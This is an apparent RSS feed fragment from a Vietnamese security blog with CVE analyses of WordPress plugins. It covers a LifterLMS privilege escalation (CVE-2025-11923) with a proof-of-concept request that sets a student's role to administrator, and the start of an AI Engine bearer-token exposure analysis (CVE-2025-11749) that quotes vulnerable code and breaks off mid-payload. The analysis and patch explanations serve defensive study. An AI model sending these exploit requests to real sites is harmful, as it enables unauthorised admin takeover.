id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng tài khoản student&lt;/li&gt;&#xA;&lt;li&gt;Login vào Admin Dash board và lấy nonce từ browser console thông qua gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/llms/v1/students/8 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: student_cookie&#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;roles=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#39; alt=&#34;Result&#34; height=&#34;912&#34; width=&#34;1540&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc &lt;strong&gt;logic kiểm tra quyền và logic cập nhật dữ liệu bị tách rời&lt;/strong&gt;, cho phép trường &lt;code&gt;roles&lt;/code&gt; được xử lý sau khi vượt qua bước kiểm tra ban đầu. Điều này khiến người dùng hợp lệ có thể tự gán quyền cao hơn cho chính mình thông qua REST API, dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&#xA;Bản vá đã khắc phục bằng cách áp dụng đầy đủ kiểm tra quyền của WordPress trước khi cho phép thay đổi role.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không được xử lý dữ liệu nhạy cảm ngoài phạm vi kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;roles&lt;/code&gt; phải luôn được kiểm soát bằng permission gốc của WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra quyền cần gắn chặt với toàn bộ luồng xử lý, không chỉ ở bước đầu.&lt;/li&gt;&#xA;&lt;li&gt;Việc tách logic không đồng bộ có thể dẫn đến leo thang đặc quyền nghiêm trọng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/lifterlms/vulnerability/wordpress-lifterlms-plugin-various-versions-authenticated-student-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin &amp;lt;= 9.1.0 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11749 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</link>
      <pubDate>Thu, 01 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin AI Engine cho WordPress bị lỗ hổng &lt;strong&gt;lộ thông tin nhạy cảm&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;3.1.3&lt;/strong&gt;, thông qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. Lỗ hổng này làm lộ &lt;strong&gt;Bearer Token&lt;/strong&gt; khi tùy chọn &lt;strong&gt;“No-Auth URL”&lt;/strong&gt; được bật. Điều này cho phép kẻ tấn công &lt;strong&gt;không cần xác thực&lt;/strong&gt; lấy được bearer token, từ đó có thể truy cập vào một phiên làm việc hợp lệ và thực hiện nhiều hành động như &lt;strong&gt;tạo tài khoản quản trị viên mới&lt;/strong&gt;, dẫn đến &lt;strong&gt;leo thang đặc quyền&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11749&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11749&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;    // Load bearer token if not already loaded&#xA;    if ( $this-&amp;gt;bearer_token === null ) {&#xA;      $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_bearer_token&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // No-Auth URL endpoints (with token in path)&#xA;    $noauth_enabled = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_noauth_url&amp;#39; );&#xA;    if ( $noauth_enabled &amp;amp;&amp;amp; !empty( $this-&amp;gt;bearer_token ) ) {&#xA;        ...&#xA;        register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/messages&amp;#39;, [&#xA;            &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;handle_message&amp;#39; ],&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;                return $this-&amp;gt;handle_noauth_access( $request );&#xA;            },&#xA;        ] );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều kiện để các API này hoạt động là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Bearer Token&lt;/strong&gt; phải được thiết lập (đã tồn tại giá trị).&lt;/li&gt;&#xA;&lt;li&gt;Tùy chọn &lt;strong&gt;No-Auth URL&lt;/strong&gt; phải được bật.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta có thể hoàn thành các thiết lập này trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;) theo thứ tự như sau:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#34; title=&#34;Setup Bearer Token và No-Auth URL&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Setup Bearer Token và No-Auth URL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#39; alt=&#34;Enable&#34; height=&#34;472&#34; width=&#34;868&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setup Bearer Token và No-Auth URL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta đặt &lt;strong&gt;Bearer Token&lt;/strong&gt; thành 1 chuỗi bất kì, ví dụ: &lt;code&gt;aaaaaaaaaa&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chuỗi này đóng vai trò như &lt;strong&gt;chìa khóa bí mật để&lt;/strong&gt; truy cập các API này.&#xA;Chỉ những ai biết giá trị này mới có thể gọi được các endpoint tương ứng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, theo mô tả của CVE thì đây là 1 phần của lỗ hổng, ngay cả người dùng chưa đăng nhập cũng có biết giá trị của &lt;strong&gt;Bearer Token&lt;/strong&gt; =&amp;gt; không còn là &lt;strong&gt;bí mật&lt;/strong&gt; nữa.&lt;/p&gt;&#xA;&lt;p&gt;Mọi thứ được &lt;strong&gt;bật mí&lt;/strong&gt; khi ta truy cập &lt;code&gt;/wp-json&lt;/code&gt;, WordPress sẽ trả về &lt;strong&gt;REST API Index&lt;/strong&gt; — tức là bản mô tả toàn bộ các API mà website đang cung cấp, bao gồm các API chứa &lt;strong&gt;Bearer Token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#34; title=&#34;Giá trị Bearer Token trong response&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/exposed.png&#34; data-sub-html=&#34;&lt;h2&gt;Exposed&lt;/h2&gt;&lt;p&gt;Giá trị Bearer Token trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#39; alt=&#34;Exposed&#34; height=&#34;877&#34; width=&#34;1570&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị Bearer Token trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tất cả người dùng (kể cả &lt;strong&gt;chưa đăng nhập&lt;/strong&gt;) đều có thể gọi đến &lt;code&gt;/wp-json&lt;/code&gt; này.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v3.1.4&lt;/strong&gt; thêm tùy chọn &lt;code&gt;&#39;show_in_rest&#39; =&amp;gt; false&lt;/code&gt; khi đăng ký API, nhằm &lt;strong&gt;ẩn các endpoint khỏi &lt;code&gt;/wp-json&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#39; alt=&#34;Patch&#34; height=&#34;601&#34; width=&#34;1770&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này giúp:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Không hiển thị API trong danh sách REST&lt;/li&gt;&#xA;&lt;li&gt;Giảm khả năng bị dò quét&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;API vẫn truy cập được nếu biết URL&lt;/li&gt;&#xA;&lt;li&gt;Không thay thế cho cơ chế xác thực an toàn&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Đây chỉ là biện pháp che giấu, không phải bảo mật thực sự.&lt;/p&gt;&#xA;&lt;p&gt;API đã được đăng ký với &lt;code&gt;permission_callback&lt;/code&gt; là &lt;code&gt;handle_noauth_access&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_noauth_access( $request ) {&#xA;    // For no-auth URLs, the token is already verified by being in the URL path&#xA;    // Double-check that the route actually contains the token&#xA;    $route = $request-&amp;gt;get_route();&#xA;    if ( strpos( $route, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/&amp;#39; ) === false ) {&#xA;      if ( $this-&amp;gt;logging ) {&#xA;        error_log( &amp;#39;[AI Engine MCP] ❌ Invalid no-auth URL access attempt.&amp;#39; );&#xA;      }&#xA;      return false;&#xA;    }&#xA;&#xA;    // Set the current user to admin since token is valid&#xA;    if ( $admin = $this-&amp;gt;core-&amp;gt;get_admin_user() ) {&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra &lt;strong&gt;Bearer Token&lt;/strong&gt; có hợp lệ hay không. Nếu hợp lệ, hàm sẽ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gán người dùng hiện tại thành admin, cho phép &lt;code&gt;&amp;quot;request hiện tại&amp;quot;&lt;/code&gt; tiếp tục thực thi với toàn quyền quản trị. Sau khi request kết thúc thì quyền admin cũng hết.&lt;/p&gt;&#xA;&lt;p&gt;Khi ta truy cập endpoint &lt;code&gt;/wp-json/mcp/v1/aaaaaaaaaa/messages&lt;/code&gt; thì callback &lt;code&gt;handle_message&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_message( WP_REST_Request $request ) {&#xA;    ...&#xA;    $raw = $request-&amp;gt;get_body();&#xA;    $dat = json_decode( $raw, true );&#xA;    ...&#xA;    $id = $dat[&amp;#39;id&amp;#39;] ?? null;&#xA;    $method = $dat[&amp;#39;method&amp;#39;] ?? null;&#xA;    ...&#xA;    // It&amp;#39;s a notification, no ID = no reply&#xA;    if ( $id === null &amp;amp;&amp;amp; $method !== null ) {&#xA;      return new WP_REST_Response( null, 204 );&#xA;    }&#xA;    ...&#xA;    try {&#xA;&#xA;      $reply = null;&#xA;&#xA;      #region Methods switch&#xA;      switch ( $method ) {&#xA;        ...&#xA;        case &amp;#39;tools/call&amp;#39;:&#xA;          $params = $dat[&amp;#39;params&amp;#39;] ?? [];&#xA;          $tool = $params[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;          $arguments = $params[&amp;#39;arguments&amp;#39;] ?? [];&#xA;&#xA;          if ( $this-&amp;gt;logging ) {&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] 🔧 tools/call - Tool: &amp;#39; . $tool );&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] 🔧 tools/call - Arguments: &amp;#39; . wp_json_encode( $arguments ) );&#xA;          }&#xA;&#xA;          try {&#xA;            $reply = $this-&amp;gt;execute_tool( $tool, $arguments, $id );&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ✅ tools/call - Success for tool: &amp;#39; . $tool );&#xA;            }&#xA;          }&#xA;          catch ( Exception $e ) {&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ❌ tools/call - Error: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;            }&#xA;            throw $e;&#xA;          }&#xA;          break;&#xA;        ...&#xA;      }&#xA;      #endregion&#xA;&#xA;      if ( $reply ) {&#xA;        // Don&amp;#39;t log response queuing - it&amp;#39;s too noisy&#xA;        $this-&amp;gt;store_message( $sess, $reply );&#xA;      }&#xA;&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      $this-&amp;gt;queue_error( $sess, $id, -32603, &amp;#39;Internal error&amp;#39;, $e-&amp;gt;getMessage() );&#xA;    }&#xA;&#xA;    return new WP_REST_Response( null, 204 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận một request JSON, phân tích nội dung, thực thi hành động tương ứng và trả kết quả (nếu cần).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu là notification (không có &lt;code&gt;id&lt;/code&gt;) → Không cần phản hồi → trả HTTP 204&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($id === null &amp;amp;&amp;amp; $method !== null)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Xử lý theo method: Nếu là &lt;code&gt;tools/call&lt;/code&gt; thì lấy các param cần thiết và gọi đến &lt;code&gt;execute_tool( $tool, $arguments, $id );&lt;/code&gt; để thực thi tool nội bộ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Request body hiện tại sẽ như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: 